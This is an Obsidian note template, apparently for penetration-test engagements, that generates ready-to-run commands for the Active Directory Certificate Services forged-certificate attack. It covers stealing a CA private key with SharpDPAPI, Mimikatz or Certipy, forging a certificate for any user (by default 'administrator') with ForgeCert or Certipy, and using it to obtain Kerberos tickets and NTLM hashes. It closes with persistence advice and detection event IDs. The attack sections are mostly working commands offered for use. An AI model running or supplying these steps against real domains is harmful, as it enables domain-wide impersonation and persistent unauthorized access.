---
# Attack-specific fields
ca_server:
ca_name:
ca_cert_pfx:
ca_cert_password:
impersonate_user:
forged_cert_b64:
tgt_ticket:
notes:
---

# ADCS — Forged Certificates (CA Key Theft)

> [!abstract] Attack Summary
> If you can access the CA's private key (via SharpDPAPI, Mimikatz, or direct file access), you can forge certificates for **any** user in the domain. This is the most powerful ADCS attack — certificates persist even after password resets, and the forged cert provides a path to any user's TGT indefinitely.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["CA Server FQDN",        `\`INPUT[text:ca_server]\``],
  ["CA Name",               `\`INPUT[text:ca_name]\``],
  ["CA PFX File Path",      `\`INPUT[text:ca_cert_pfx]\``],
  ["CA PFX Password",       `\`INPUT[text:ca_cert_password]\``],
  ["User to Impersonate",   `\`INPUT[text(defaultValue("${p.impersonate_user ?? 'administrator'}")):impersonate_user]\``],
]);
```

---

## Step 1 — Locate and Extract the CA Certificate + Key

> [!info] The CA private key is stored as a DPAPI-protected blob in `%SystemRoot%\System32\CertSrv\CertEnroll\` or in the machine's certificate store. Requires admin/SYSTEM on the CA server.

**Windows — SharpDPAPI**
```dataviewjs
dv.paragraph("```bash\n# Extract CA private key\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe certificates /machine\n\n# Or target the CA cert store specifically\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe machinecerts\n```");
```

**Windows — Mimikatz**
```dataviewjs
dv.paragraph("```bash\n# Crypto module to export CA cert\ncrypto::capi\ncrypto::certificates /export /systemstore:LOCAL_MACHINE\n\n# The .pfx file will be saved to disk\n```");
```

**Linux — Certipy (remote)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const caServer = p?.ca_server || "CA_SERVER";
dv.paragraph("```bash\ncertipy ca -u '" + username + "@" + domain + "' -p '" + password + "' -dc-ip " + dc_ip + " -ca '" + (p?.ca_name || "CA_NAME") + "' -backup\n```");
```

CA PFX path: `INPUT[text:ca_cert_pfx]` | Password: `INPUT[text:ca_cert_password]`

---

## Step 2 — Forge a Certificate for Target User

**Windows — ForgeCert**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain       = b?.domain ?? "domain.local";
const caFile       = p?.ca_cert_pfx   || "ca.pfx";
const caPass       = p?.ca_cert_password || "ca_password";
const impersonate  = p?.impersonate_user || "administrator";
dv.paragraph("```bash\n# Forge cert for target user\nC:\\Tools\\ForgeCert\\ForgeCert\\bin\\Release\\ForgeCert.exe " +
  "--CaCertPath:" + caFile + " " +
  "--CaCertPassword:" + caPass + " " +
  "--Subject:\"CN=" + impersonate + "\" " +
  "--SubjectAltName:" + impersonate + "@" + domain + " " +
  "--NewCertPath:forged.pfx " +
  "--NewCertPassword:forged123\n```");
```

**Linux — Certipy forge**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const caFile      = p?.ca_cert_pfx || "ca.pfx";
const caPass      = p?.ca_cert_password || "ca_password";
const impersonate = p?.impersonate_user || "administrator";
dv.paragraph("```bash\ncertipy forge -ca-pfx " + caFile + " -upn '" + impersonate + "@" + domain + "' -subject 'CN=" + impersonate + "' -out forged.pfx\n```");
```

---

## Step 3 — Convert Forged Certificate (if needed)

```dataviewjs
dv.paragraph("```bash\n# Convert forged PEM to PFX\nopenssl pkcs12 -in forged.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out forged.pfx\n\n# Convert PFX to base64\ncat forged.pfx | base64 -w 0\n```");
```

Paste base64 cert: `INPUT[text:forged_cert_b64]`

---

## Step 4 — Authenticate with Forged Certificate

**Windows — Rubeus**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const impersonate = p?.impersonate_user || "administrator";
const certB64     = p?.forged_cert_b64  || "BASE64_CERT";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt " +
  "/user:" + impersonate + " /certificate:" + certB64 + " /password:forged123 /domain:" + domain + " /nowrap\n```");
```

**Linux — Certipy**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain      = b?.domain ?? "DOMAIN";
const dc_ip       = b?.dc_ip  ?? "DC_IP";
const impersonate = p?.impersonate_user || "administrator";
dv.paragraph("```bash\ncertipy auth -pfx forged.pfx -domain " + domain + " -dc-ip " + dc_ip + "\n\n# Output: NTLM hash + TGT ccache file\n```");
```

Paste TGT: `INPUT[text:tgt_ticket]`

---

## Step 5 — Persistence Note

> [!important] Certificate-Based Persistence
> Forged certificates remain valid for the template's validity period (often 1-5 years). Unlike passwords, certificates:
> - Survive password resets
> - Are not invalidated when krbtgt is rotated
> - Are only revoked if the CA's CRL is updated or the CA cert is regenerated
> - Make this an extremely persistent foothold

---

## OPSEC

> [!warning] Detection Indicators
> - CA private key export generates **Event 4657** (registry value modified) or **Event 70** in the Application log.
> - ForgeCert/Certipy forge does NOT generate enrollment events (bypasses CA entirely).
> - PKINIT authentication with a forged cert may generate **Event 4768** with unusual certificate fields.
> - Monitor CA audit logs for unexpected private key operations.

---

## Notes & Results

`INPUT[textarea:notes]`
